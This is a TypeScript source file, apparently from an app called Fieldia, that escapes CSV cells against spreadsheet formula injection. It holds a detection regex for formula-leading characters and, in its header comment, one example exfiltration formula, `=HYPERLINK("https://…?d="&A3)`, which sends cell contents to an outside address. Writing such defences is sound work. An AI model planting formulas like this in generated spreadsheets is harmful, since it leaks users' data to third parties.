/**
 * Every cell of a CSV file Fieldia writes — a list's export, the rows an import could not take, the designer's
 * translations — goes through `csvCell`: what a spreadsheet opens as words stays words. A cell of words that starts as
 * a formula would — `=`, `+`, `-`, `@`, a tab or a line return, or their fullwidth forms `＝ ＋ － ＠` — starts with `'`,
 * which a spreadsheet reads as "these are words" (OWASP's CSV injection: `=HYPERLINK("https://…?d="&A3)` would send
 * the sheet's other cells away). A number the file means as one (`{ number: '-2.50' }`) is written as it is, so a
 * spreadsheet still adds it up. `csvWords` reads a cell back as it was: the `'` taken off again.
 */

/** A cell: words, or a number written as the file writes numbers (its decimal mark, its minus). */
export type CsvValue = string | { readonly number: string };

/** What a spreadsheet runs as a formula at a cell's start — after the `'`s a cell kept so already starts with, read back as they were. */
const FORMULA = /^'*[=+\-@\t\r\uff1d\uff0b\uff0d\uff20]/;

/** A cell as the file holds it: words that read as a formula kept as words; quoted where it holds `split` (any of its characters), a quote or a line break, or a space at an end. */
export function csvCell(value: CsvValue, split = ','): string {
  if (typeof value !== 'string') return value.number;
  const text = FORMULA.test(value) ? `'${value}` : value;
  return [...split].some((char) => text.includes(char)) || /["\r\n]|^\s|\s$/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

/** A cell read back as it was written: the `'` that kept a formula's start as words taken off. */
export const csvWords = (cell: string): string => (cell[0] === "'" && FORMULA.test(cell.slice(1)) ? cell.slice(1) : cell);
